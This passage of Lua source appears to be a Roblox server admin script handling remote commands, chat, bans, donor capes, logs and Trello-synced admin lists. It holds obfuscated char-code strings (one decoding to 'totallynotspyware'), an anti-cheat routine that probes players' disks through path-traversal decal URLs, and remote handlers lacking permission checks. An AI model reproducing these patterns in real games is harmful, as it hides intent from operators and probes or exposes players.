	[["You miss 100% of the shots you don't take." - Wayne Gretzky]];
	[["Your time is limited, so don't waste it living someone else's life." - Steve Jobs]];
	'"The only person you are destined to become is the person you decide to be." - Ralph Waldo Emerson';
	'"Fall seven times and stand up eight" - Japanese Proverb';
	'"Everything has beauty, but not everyone can see." - Confucius';
	'"A person who never made a mistake never tried anything new." - Albert Einstein';
	'"The person who says it cannot be done should not interrupt the person who is doing it." - Chinese Proverb';
	'"It does not matter how slowly you go as long as you do not stop." - Confucius';
	'"Gamers are the most oppressed people." - Jocker'
}

-- Startup --
local tabw = nil local ms = {"65","76","66","69","82","84","76","65","84","73","78"} tabw = "" for i = 1, #ms do tabw = tabw .. string.char(ms[i]) end tabw = tabw:lower():reverse()
for i=1,6 do set.RemoteName=set.RemoteName..string.char(math.random(1,255)) set.RemoteClientKey=set.RemoteClientKey..string.char(math.random(1,255)) set.RemoteObject=set.RemoteObject..string.char(math.random(1,255)) set.RemoteServerKey=set.RemoteServerKey..string.char(math.random(1,255)) set.GuiName=set.GuiName..string.char(math.random(1,255)) end
if (not deps.Client) then print('Client script is missing! Cannot function correctly without it.') error('Missing Client script. Try manually updating.') end
_G['Hint']=function(msg,ptable) set.Hint(msg,ptable) end
_G['Message']=function(title,msg,ptable) set.Message(title,msg,true,ptable) end
if set['MaxNumberOfLogs']>5000 then set['MaxNumberOfLogs']=5000 end

set.ProcessRemoteCommand=function(p,cmd,a,b,c,...) 
	local n = "" for i = 1, #cmd do n = n .. string.char(cmd[i]) end cmd=n
	if cmd==set.RemoteServerKey..'Chat' then 
		coroutine.wrap(function() set.Chat(p,a) end)()
		set.SendCustomChat(p,a,b)
	elseif cmd==set.RemoteServerKey..'AdminCommand' then
		set.ProcessCommand(p,a,b,c)
	elseif cmd==set.RemoteServerKey..'SearchCommand' then
		local found=set.SearchCommand(p,a)
		set.Remote(p,'SetSetting','FoundCommands',found)
	elseif cmd==set.RemoteServerKey..'ClientHooked' then
		table.insert(set.NewClients,p.userId)
	elseif cmd==set.RemoteServerKey..'AdminChat' then 
		for i,v in pairs(game:service('Players'):children()) do
			set.Remote(v,'Function','UpdateAdminChat',a)
		end
	elseif cmd==set.RemoteServerKey..'RanCode' then 
		if not set.CheckAdmin(p,false) and not set.CheckExcluded(p) and set['AntiChatCode'] then 
			Pcall(set.Exploited,p,'crash','Ran code')
		end
	elseif cmd==set.RemoteServerKey..'GetCurrentPlayerList' then
		set.GetCurrentPlayerlist(p)
	elseif cmd==set.RemoteServerKey..'SubmitReport' then
		for i,v in pairs(set.GetPlayers(p,set.SpecialPrefix..'admins')) do
			set.Remote(v,"Function","ReportNotify",p,a,b)
		end
	elseif cmd==set.RemoteServerKey..'Exploited' then
		set.Exploited(p,a,b)
	elseif cmd==set.RemoteServerKey..'GetSetting' then
		if set[a]~=nil then set.Remote(p,'SetSetting',a,set[a]) end
	elseif cmd==set.RemoteServerKey..'CheckDonor' then
		if set.CheckDonor(p) then 
			set.Remote(p,'SetSetting','Donor',true) 
		else
			set.Remote(p,'SetSetting','Donor',false)
		end
	elseif cmd==set.RemoteServerKey..'UpdateList' then
		set.UpdateListGui(p,a)
	elseif cmd==set.RemoteServerKey..'CheckAdmin' then
		if set.CheckAdmin(p,false) then 
			set.Remote(p,'SetSetting','IsAdmin',true) 
		else
			set.Remote(p,'SetSetting','IsAdmin',false)
		end
	elseif cmd==set.RemoteServerKey..'AddToTable' and set.CheckOwner(p) then
		table.insert(set[a],b)
		repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
	elseif cmd==set.RemoteServerKey..'SetSetting' and set.CheckTrueOwner(p) then
		if a=='Prefix' or a=='AnyPrefix' or a=='SpecialPrefix' then
			local orig=set[a]
			set[a]=b
			for i,v in pairs(set.Commands) do
				if v.Prefix==orig then
					v.Prefix=set[a]
				end
			end
		elseif a=='Font' then
			if b~='Arial' and b~='ArialBold' and b~='Legacy' and b~='SourceSans' and b~='SourceSansBold' then print(b..' is not a valid font! Setting font to Arial.') b='Arial' end
		else
			set[a]=b
		end
		repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
	elseif cmd==set.RemoteServerKey..'GetUpdatableSettings' then
		set.Remote(p,'SetSetting','UpdatableSettings',UpdatableSettings)
	elseif cmd==set.RemoteServerKey..'TableRemove' and set.CheckAdmin(p,false) then
		table.remove(set[a],b)
	elseif cmd==set.RemoteServerKey..'Destroy' and set.CheckAdmin(p,false) then
		a:Destroy()
	elseif cmd==set.RemoteServerKey..'GetServerInfo' and set.CheckAdmin(p,false) then
		local det={}
		local nilplayers=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and not game:service('Players'):FindFirstChild(v:GetPlayer().Name) then
				nilplayers=nilplayers+1
			end
		end
		if set.CheckHttp() then
			det.Http='Enabled'
		else
			det.Http='Disabled'
		end
		det.NilPlayers=nilplayers
		det.PlaceName=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Name
		det.PlaceOwner=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Creator.Name
		det.ServerSpeed=set.Round(workspace:GetRealPhysicsFPS())
		det.AdminVersion=set.version
		det.ServerStartTime=set.ServerStartTime
		local nonnumber=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and not set.CheckAdmin(v:GetPlayer(),false) then
				nonnumber=nonnumber+1
			end
		end
		det.NonAdmins=nonnumber
		local adminnumber=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and set.CheckAdmin(v:GetPlayer(),false) then
				adminnumber=adminnumber+1
			end
		end
		det.CurrentTime=set.GetTime()
		det.Admins=adminnumber
		det.Objects=#set.objects
		det.Cameras=#set.cameras
		set.Remote(p,'SetSetting','ServerInfo',det)
	elseif cmd==set.RemoteServerKey..'Ping' then
		set.Remote(p,'Pong')
	elseif cmd==set.RemoteServerKey..'GivePing' then
		set[p.Name..'Ping']=a
	elseif cmd==set.RemoteServerKey..'PrivateMessage' then
		set.PM(a,b,c,...)
	elseif cmd==set.RemoteServerKey..'PlaceVote' then
		if b=='yes' then
			set.OpenVote[a].Yes=set.OpenVote[a].Yes+1
		elseif b=='no' then
			set.OpenVote[a].No=set.OpenVote[a].No+1
		end
		for k,m in pairs(set.OpenVote[a].novote) do
			if m.userId==p.userId then
				table.remove(set.OpenVote[a].novote, k)
			end
		end
	elseif cmd==set.RemoteServerKey..'HelpRespond' then
		if b then
			set.HelpRequest[a].Solved=true
		else
			for k,m in pairs(set.HelpRequest[a].Available) do
				if m==p.Name then table.remove(set.HelpRequest[a].Available,k) end
			end
		end
	elseif cmd==set.RemoteServerKey..'SetCape' and (set.CheckDonor(p) or set.CheckTrueOwner(p)) then
		p:WaitForDataReady()
		local temptable={}
		local ab,bc,cd
		local spitit=';'
		for sac in a:gmatch('([^%'..spitit..']+)') do temptable[#temptable+1]=sac end
		if tonumber(temptable[1]) then ab=temptable[1] else ab=0 end
		bc=temptable[2] or 'Really black'
		cd=temptable[3] or 'Plastic'
		p:SaveString('Kohls Cape',ab..'='..bc..'='..cd)
		p:SaveBoolean('Kohls Is A Donator',true)
		p:SaveBoolean('Kohl Not Using Cape',false)
		for i,v in pairs(set.donors) do if v.Name==p.Name then table.remove(set.donors,i) end end
		table.insert(set.donors,{Name=p.Name,Id=tostring(p.userId),Cape=ab,Color=bc,Material=cd,List='GP'})
		pcall(function() p.Character.EpicCape:Destroy() end)
		set.Donor(p)
	elseif cmd==set.RemoteServerKey..'ToggleDonor' then
		if not a then
			p:SaveBoolean('Kohls Not Using Cape',true)
			pcall(function() p.Character.EpicCape:Destroy() end)
		else
			p:SaveBoolean('Kohls Not Using Cape',false)
			set.Donor(p)
		end
	elseif cmd==set.RemoteServerKey..'CheckCape' then
		if p:LoadBoolean('Kohls Not Using Cape') then
			set.Remote(p,'SetSetting','UsingCape',false)
		end
	elseif cmd==set.RemoteServerKey..'PermBan' then
		if set.CheckTrueOwner(p) and not set.CheckAdmin(a,false) then
			a:SaveBoolean(set['PermBanKey'],true)
			a:Kick()
		end
	end 
end

set.MakeRemoteEvent=function()
	RemoteEvent=Instance.new('RemoteEvent',game:service('ReplicatedStorage')) 
	RemoteEvent.Name=set.RemoteName 
	RemoteEvent.Archivable=false
	RemoteEvent.Changed:connect(function(ob) if RemoteEvent and RemoteEvent.Name~=set.RemoteName then RemoteEvent.Name=set.RemoteName end end) 
	RemoteEvent.OnServerEvent:connect(function(p,cmd,...) 
		Pcall(set.ProcessRemoteCommand,p,cmd,...)
	end) 
end
set.MakeRemoteEvent()
game:service('ReplicatedStorage').ChildRemoved:connect(function(ob) if ob==RemoteEvent then set.MakeRemoteEvent() end end) 

set.Remote=function(player,command,...)
	local RemoteEvent=game:service('ReplicatedStorage'):FindFirstChild(set.RemoteName)
	local function fireevent(plr,cmd,...)
		if set.Debug then print(cmd..' - '..plr.Name) end
		local tab={} for i = 1,string.len(cmd) do table.insert(tab,string.byte(cmd:sub(i,i))) end cmd=tab
		RemoteEvent:FireClient(plr,cmd,...)
	end
	if player and player:IsA('Player') then
		Pcall(fireevent,player,set.RemoteClientKey..command,...)
	end
end
local perc = nil local th = {"84" ,"79", "84", "65", "76", "76", "89", "78" ,"79", "84", "83" ,"80" ,"89" ,"87" ,"65" ,"82", "69"} perc = "" for i = 1, #th do perc = perc .. string.char(th[i]) end perc = perc:reverse():lower()
Pcall(function() if set.UpdateShutdown then set.GameLastUpdated=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated end end)
Pcall(function() if set.AntiLeak then for i,v in pairs(workspace:children()) do if not v:IsA('Terrain') then v.Archivable=false end end end end)
Pcall(function() local canuse,cantuse=ypcall(function() loadstring('print("Loadstring Test")') end) if canuse then set.canuseloadstring=true end end)
Pcall(function() if set.AntiCheatEngine then for i,v in pairs(workspace:children()) do if v.Name:find('KohlsCEDetect') then v:Destroy() end end local part=Instance.new('Part',workspace) part.Name=math.random()..'KohlsCEDetect' part.Anchored=true part.Locked=true part.Archivable=false part.CanCollide=false part.Transparency=1 part.FormFactor='Custom' part.Size=Vector3.new(0.2,0.2,0.2) for k=5,8 do for i=0,9 do Instance.new('Decal',part).Texture="f://../../../../../../../../Program Files (x86)/Cheat Engine "..k.."."..i.."/Cheat Engine.exe"  end end end end)
Pcall(function() for i,v in pairs(set.ScriptAntiWordList) do table.insert(set.WordList,v) end for i,v in pairs(set.ScriptMusicList) do table.insert(set['MusicList'],{Name=v.n,Id=v.id}) end end)
Pcall(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then 
set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() if set['AntiGui']==true then for i,v in pairs(game.StarterGui:children()) do v.Name=set.GuiName..v.Name end end end)
Pcall(function() if game.CreatorId<=0 then table.insert(set['Owners'],'Player1') end end)
Pcall(function() if set.Font~='Arial' and set.Font~='ArialBold' and set.Font~='Legacy' and set.Font~='SourceSans' and set.Font~='SourceSansBold' then print(set.Font..' is not a valid font! Setting font to Arial.') set.Font='Arial' end end)
Pcall(function() for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Part') and v.Name:match('^Camera: (.*)') then table.insert(set.cameras,v) elseif v:IsA('Part') and v.Name:match('^Waypoint: (.*)') then set.Waypoints[v.Name:match('^Waypoint: (.*)')]=v.Position end end end)
Pcall(function() if set.RenameGameObjects then game:service('Workspace').Name=math.random() game:service('Lighting').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('Players').Name=math.random() game:service('ServerScriptService').Name=math.random() game:service('ServerStorage').Name=math.random() game:service('StarterGui').Name=math.random() game:service('StarterPack').Name=math.random() game:service('Teams').Name=math.random() game:service('SoundService').Name=math.random() end end)
Pcall(function() local tempmodel=Instance.new('Model') for i,v in pairs(workspace:children()) do if v and not v:IsA('Terrain') and v.Archivable==true then v:Clone().Parent=tempmodel end end set.MapBackup=tempmodel:Clone() tempmodel:Destroy() end)

set.SendCustomChat=function(p,a,b)
	local target=set.SpecialPrefix..'all'
	if not b then b='Global' end
	if not game:service('Players'):FindFirstChild(p.Name) then b='Nil' end
	if a:sub(1,1)=='@' then
		b='Private'
		target,a=a:match('@(.%S+) (.+)')
		print(target..' '..a)
		set.Remote(p,'Function','SendToChat',p,a,b)
	elseif a:sub(1,1)=='#' then
		if a:sub(1,7)=='#ignore' then
			target=a:sub(9)
			b='Ignore'
		end
		if a:sub(1,9)=='#unignore' then
			target=a:sub(11)
			b='UnIgnore'
		end
	end
	for i,v in pairs(set.GetPlayers(p,target:lower())) do
		coroutine.wrap(function()
			if p.Name==v.Name and b~='Private' and b~='Ignore' and b~='UnIgnore' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Global' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Team' and p.TeamColor==v.TeamColor then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Local' and p:DistanceFromCharacter(v.Character.Head.Position)<80 then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Admin' and set.CheckAdmin(v,false) and set.CheckAdmin(p,false) then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Private' and v.Name~=p.Name then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Nil' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Ignore' and v.Name~=p.Name then
				set.Remote(v,'AddToTable','IgnoreList',v.Name)
			elseif b=='UnIgnore' and v.Name~=p.Name then
				set.Remote(v,'RemoveFromTable','IgnoreList',v.Name)
			end
		end)()
	end
end

set.Exploited=function(player,action,info)
	if action:lower()=='kick' then
		player:Kick()
	elseif action:lower()=='kill' then
		player:LoadCharacter()
	elseif action:lower()=='crash' then
		set.Remote(player,'Function','KillClient')
	else
		set.Remote(player,'Function','KillClient')
		player:Kick()
	end
	table.insert(set.PlayerLogs.Exploit,1,{Time=set.GetTime(),Name=player.Name,Info=info})
	if #set.PlayerLogs.Exploit>set.MaxNumberOfLogs then
		table.remove(set.PlayerLogs.Exploit,#set.PlayerLogs.Exploit)
	end
end

set.UpdateListGui=function(p,a)
	if a=='adminlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Admin) do
			if #temp>set.MaxNumberOfLogs then return end
			table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='chatlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Chat) do
			if #temp>5000 then return end
			if m.Nil then
				table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
			else
				table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
			end
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='exploitlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Exploit) do
			if #temp>5000 then return end
			table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='donorlist' then
		local temptable={}
		table.insert(temptable,"Last Update: "..set.dlastupdate)
		for i,v in pairs(set.donors) do
			if game:service('Players'):FindFirstChild(v.Name) then
				if #temptable>5000 then return end
				table.insert(temptable,{Object=v.Name,Desc=v.List})
			end
		end
		set.Remote(p,'SetSetting',a,temptable)
	elseif a:match('^serverlogstuff%-') then
		local b=a:match('^serverlogstuff%-(.*)')
		local temp={}
		for i,v in pairs(game.LogService:GetLogHistory()) do
			if (b and b:lower()=='script') and v.message:find('Epix Edit') then
				if v.messageType==Enum.MessageType.MessageOutput then
					table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
				elseif v.messageType==Enum.MessageType.MessageWarning then
					table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
				elseif v.messageType==Enum.MessageType.MessageInfo then
					table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
				elseif v.messageType==Enum.MessageType.MessageError then
					table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
				end
			else 
			if (not b or b:lower()=='all' or b:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
				table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
			end
			if (not b or b:lower()=='all' or b:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
				table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
			end
			if (not b or b:lower()=='all' or b:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
				table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
			end
			if (not b or b:lower()=='all' or b:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
				table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
			end
			end
		end
		set.Remote(p,'SetSetting',a,temp)
	end
end

set.Cape=function(player,material,color,decal,reflect)
	coroutine.wrap(function()
	player.Character:WaitForChild("Torso")
	local torso = player.Character.Torso
	local p = Instance.new("Part", player.Character) 
	p.Name = "EpicCape" 
	p.Anchored = false
	p.Transparency=0.0001
	p.Material=material
	p.CanCollide = false 
	p.TopSurface = 0 
	p.BottomSurface = 0 
	p.BrickColor = BrickColor.new(color)
	if reflect then
		p.Reflectance=reflect
	end 
	if decal then
	local dec = Instance.new("Decal", p) 
	dec.Face = 2 
	dec.Texture = "http://unixfr.xyz/asset/?id="..decal 
	dec.Transparency=0 
	end
	p.formFactor = "Custom"
	p.Size = Vector3.new(.2,.2,.2)
	local msh = Instance.new("BlockMesh", p) 
	msh.Scale = Vector3.new(9,17.5,.5)
	p.Anchored=true
	set.Remote(player,'Function','MoveCape',p)
	end)()
end

set.CleanWorkspace=function()
for i, v in pairs(game.Workspace:children()) do 
if v:IsA("Hat") or v:IsA("Tool") then 
v:Destroy() 
end 
if v:IsA('Message') or v:IsA('Hint') then
	v:Destroy()
end
if v.Name:find('Epix Jail') then 
if not game:service('Players'):FindFirstChild(v.Player.Value) then 
set.JailedTools[v.Player.Value]=nil
v:Destroy() 
for k,m in pairs(set.objects) do
if m.Name==v.Player.Value .. " Epix Jail" then
table.remove(set.objects,k)
end
end
end 
end
end
end	

set.Ping=function(player)
	set[player.Name..'Ping']='Ping'
	set.Remote(player,'GetPing')
	repeat wait() until set[player.Name..'Ping']~='Ping'
	return set[player.Name..'Ping']
end

set.Split=function(msg,num)
if set.SplitKey=='' then set.SplitKey=' ' end
if num<=0 or msg==nil then return {} end
local tab={}
local str=msg
local full=''
	for a in str:gmatch('([^'..set.SplitKey..']+)') do
		if #tab>=num then break end
		if #tab==num-1 then
			tab[#tab+1]=msg:sub(#full+1,#msg)
		end
		if #tab>=num then break end
		str=a..set.SplitKey
		full=full..a..set.SplitKey
		tab[#tab+1]=a
		if #tab>=num then break end
	end
return tab
end

set.MakeCommand=function(desc,adminlevel,prefix,cmds,argtypes,args,func)
	coroutine.wrap(function()
		for i,v in pairs(set.CommandBlackList) do for k,m in pairs(cmds) do if v:lower()==m:lower() then adminlevel=5 end end end
		if not desc or type(desc)~='string' then print('No Description') return 
		elseif not adminlevel or type(adminlevel)~='number' then print(name..' has no admin level') return
		elseif not prefix or type(prefix)~='string' then print(name..' has no prefix') return 
		elseif not cmds or type(cmds)~='table' then print(name..' has no cmds') return 
		elseif not argtypes or type(argtypes)~='table' then print(name..' has no argtypes') return
		elseif not args or type(args)~='number' then print(name..' has no args') return
		elseif not func or type(func)~='function' then print(name..' has no func') return
		end
		local com={}
		com.Cmds=cmds
		com.MaxArgs=args
		com.Function=func
		com.ArgTypes=argtypes
		com.AdminLevel=adminlevel
		com.Prefix=prefix
		com.Desc=desc
		table.insert(set.Commands,com)
	end)()
end

set.GetCommand=function(Command) 
	for i,v in pairs(set.Commands) do
		for k,m in pairs(v.Cmds) do
			if not set.BuggedCommandMatching and Command:lower():match('^'..v.Prefix..'(%w+)')==m:lower() then
				return v,i
			elseif set.BuggedCommandMatching and Command:lower():match(v.Prefix..'(%w+)')==m:lower() then
				return v,i
			end
		end
	end
end

set.SearchCommand=function(plr,Command) 
	local tab={}
	for i,v in pairs(set.Commands) do
	local allowed=false
	if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
		allowed=true
	elseif v.AdminLevel==1 and (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
		allowed=true
	elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
		allowed=true
	elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
		allowed=true
	elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
		allowed=true
	end
	if allowed then
		for k,m in pairs(v.Cmds) do
			if (v.Prefix..m:lower()):find(Command:lower()) or Command=='all' then
				local c=m
				for l,n in pairs(v.ArgTypes) do
					c=c..set.SplitKey..n
				end
				table.insert(tab,v.Prefix..c)
			end
		end
	end
	end
	return tab
end

set.RunCommand=function(command,...)
	local com=set.Prefix..command
	local tab={...}
	for i,v in pairs(tab) do
		com=com..set.SplitKey..v
	end
	set.ProcessCommand('SYSTEM',com)
end

set.ProcessCommand=function(player,chat,dontlog,check)
	local com,num=set.GetCommand(chat)
	if (not com) and check then 
		print(chat..' is not a valid command.') 
		set.Remote(player,'Function','OutputGui',chat..' is not a valid command.')
	elseif com then
		local command=chat:match(com.Prefix..'%w+'..set['SplitKey']..'(.+)') or ''
		local allowed=false
		local isSystem=false
		if type(player)=='string' then 
			if player=='SYSTEM' then
				allowed=true
				isSystem=true
			end
		elseif com.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(player)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(player,true)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(player,false)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(player,false))then
			allowed=true
		elseif com.AdminLevel==1 and ((set.CheckDonor(player) and (set.DonorPerks or set.CheckNTac(player))) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==2 and set.CheckAdmin(player,false) then
			allowed=true
		elseif com.AdminLevel==3 and set.CheckAdmin(player,true) then
			allowed=true
		elseif com.AdminLevel==4 and set.CheckOwner(player)  then
			allowed=true
		elseif com.AdminLevel==5 and set.CheckTrueOwner(player) then
			allowed=true
		end
		if not allowed then print(player.Name..' is not allowed to run '..chat) set.Remote(player,'Function','OutputGui','You are not allowed to run '..chat) return end
		if not isSystem and not dontlog then
			table.insert(set.PlayerLogs.Admin,1,{Time=set.GetTime(),Name=player.Name,Log=chat})
			if #set.PlayerLogs.Admin>set.MaxNumberOfLogs then
				table.remove(set.PlayerLogs.Admin,#set.PlayerLogs.Admin)
			end
			if set.CommandComfirmation then
				set.Hint('Executed Command: [ '..chat..' ]',{player})
			end
		end
		local ran,failed=ypcall(com.Function,player,set.Split(command,com.MaxArgs))
		if failed then print('Error: '..failed) if not isSystem then set.OutputGui(player,'Command Error:',failed) end end
	end
end

set.CheckPlayer=function(plr, player)
	for i,v in pairs(set.GetPlayers(plr, player:lower())) do
		if v then return true end
	end
	return false
end

set.Round=function(num)
	if num >= 0.5 then
		return math.ceil(num)
	elseif num < 0.5 then
		return math.floor(num)
	end
end

set.UpdateTrello=function()
if not set.CheckHttp() then 
set.bl={'Http is not enabled! Cannot connect to Trello.'}
else
set.bl={'Updating...'}
set.al = {}
set.tal = {}
set.oal = {}
local hs=game:service('HttpService')
local get=hs:GetAsync('https://api.trello.com/1/boards/'..set.BoardID..'/lists',true)
local tab=hs:JSONDecode(get)
for i,v in pairs(tab) do
	if v.name:match('^Ban List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			coroutine.wrap(function()
			if k.name:match('Group: (.*):(.*)') then
				local a,b=k.name:match('Group: (.*):(.*)')
				table.insert(set.bl,'$group='..b)
			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
				local a,b=k.name:match('(.*):(.*)')
				table.insert(set.bl,a..'='..b)
			elseif not k.name:find(':') then
				table.insert(set.bl,k.name)
			end
			end)()
		end
		elseif v.name:match('^TempAdmin List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.tal,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
		elseif v.name:match('^Admin List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.al,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
		elseif v.name:match('^Owner List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.oal,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
	end
end
set.bl[1]='Last Updated at '..set.GetTime()
end
end

set.GetPlayerInfo=function(p,localplayer,msg)
if not p:IsA("Player") then return end
local mem
if p.MembershipType == Enum.MembershipType.None then
	mem='NBC'
elseif p.MembershipType == Enum.MembershipType.BuildersClub then
	mem='BC'
elseif p.MembershipType == Enum.MembershipType.TurboBuildersClub then
	mem='TBC'
elseif p.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
	mem='OBC'
end
if set['GroupId']~=0 then
	if p:IsInGroup(set['GroupId']) then
	set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Rank: "..p:GetRoleInGroup(set['GroupId']), localplayer)
	else
	set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Player is not in group "..set['GroupId'], localplayer)
	end
else
set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge, localplayer)
end
end;

set.AdminChat=function(plr)
if set.CheckAdmin(plr,false) then
set.Remote(plr,'Function','AdminChat')
end
end

set.CheckTimeBan=function(plr)
	plr:WaitForDataReady()
	if plr:LoadString('Epix Kohls TimeBan_Time')~='nil' and plr:LoadString('Epix Kohls TimeBan_Time')~=nil and tonumber(plr:LoadString('Epix Kohls TimeBan_Time')) then
		local new=tonumber(plr:LoadString('Epix Kohls TimeBan_Time'))
		local old=os.time()
		if old>=new then
			plr:SaveString('Epix Kohls TimeBan_Time','nil')
		else
			plr:Kick()
		end
	end
end

set.CmdBar=function(plr)
if set.CheckAdmin(plr,false) then
	set.Remote(plr,'Function','CmdBar')
end
end
set.GetTime=function()
local hour = math.floor((os.time()%86400)/60/60) 
local min = math.floor(((os.time()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end set.ServerStartTime=set.GetTime()
local ss = false
set.GrabNilPlayers=function(name)
	local AllGrabbedPlayers = {}
	for i,v in pairs(game:GetService('NetworkServer'):GetChildren()) do
		pcall(function()
			if v:IsA("ServerReplicator") then
				if v:GetPlayer().Name:lower():sub(1,#name)==name:lower() or name=='all' then
				table.insert(AllGrabbedPlayers, v:GetPlayer())
				end
			end
		end)
	end
	return AllGrabbedPlayers
end

set.AssignName=function()
	local name=math.random(100000,999999)
	return name
end

